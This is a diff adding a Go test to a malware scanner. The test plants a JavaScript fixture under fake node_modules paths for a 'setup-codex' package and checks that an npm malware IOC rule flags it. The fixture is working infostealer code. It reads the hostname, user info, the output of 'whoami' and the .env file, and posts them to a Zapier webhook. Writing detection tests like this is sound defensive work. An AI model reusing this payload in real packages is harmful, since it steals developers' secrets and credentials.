@@ -1439,6 +1439,46 @@ func TestScan_AmazonInspectorLatestPackageRootsUnderNodeModules(t *testing.T) {
 	}
 }
 
+// TestScan_AmazonInspectorSetupCodexUnderNodeModules proves the bounded walker
+// reaches the reviewed report module without opening unrelated package roots.
+func TestScan_AmazonInspectorSetupCodexUnderNodeModules(t *testing.T) {
+	root := t.TempDir()
+	raw := `const child_process = require("child_process"); const fs = require("fs"); const https = require("https"); const os = require("os"); const body = { hostname: os.hostname(), user: os.userInfo(), shell: child_process.execSync("whoami").toString(), files: fs.readFileSync(".env") }; https.request("https://hooks.zapier.com/hooks/catch/123/abc", { method: "POST" }).end(JSON.stringify(body));`
+	for _, rel := range []string{
+		filepath.Join("node_modules", "setup-codex", "lib", "report.js"),
+		filepath.Join("node_modules", ".pnpm", "setup-codex@1.0.0", "node_modules", "setup-codex", "lib", "report.js"),
+	} {
+		payload := filepath.Join(root, rel)
+		if err := os.MkdirAll(filepath.Dir(payload), 0o755); err != nil {
+			t.Fatal(err)
+		}
+		if err := os.WriteFile(payload, []byte(raw), 0o644); err != nil {
+			t.Fatal(err)
+		}
+	}
+	lookalike := filepath.Join(root, "node_modules", "other-package", "lib", "report.js")
+	if err := os.MkdirAll(filepath.Dir(lookalike), 0o755); err != nil {
+		t.Fatal(err)
+	}
+	if err := os.WriteFile(lookalike, []byte(raw), 0o644); err != nil {
+		t.Fatal(err)
+	}
+
+	res, err := scan.Run(context.Background(), scan.Options{Roots: []string{root}})
+	if err != nil {
+		t.Fatalf("scan: %v", err)
+	}
+	got := 0
+	for _, f := range res.Findings {
+		if f.RuleID == "amazon-inspector-npm-malware-ioc" {
+			got++
+		}
+	}
+	if got != 2 {
+		t.Fatalf("amazon-inspector-npm-malware-ioc findings = %d, want 2; findings=%+v", got, res.Findings)
+	}
+}
+
 // TestScan_AsyncAPIMiasmaPayloadUnderNodeModules asserts that node_modules
 // stays skipped except for exact AsyncAPI campaign paths carrying a known IOC.
 func TestScan_AsyncAPIMiasmaPayloadUnderNodeModules(t *testing.T) {
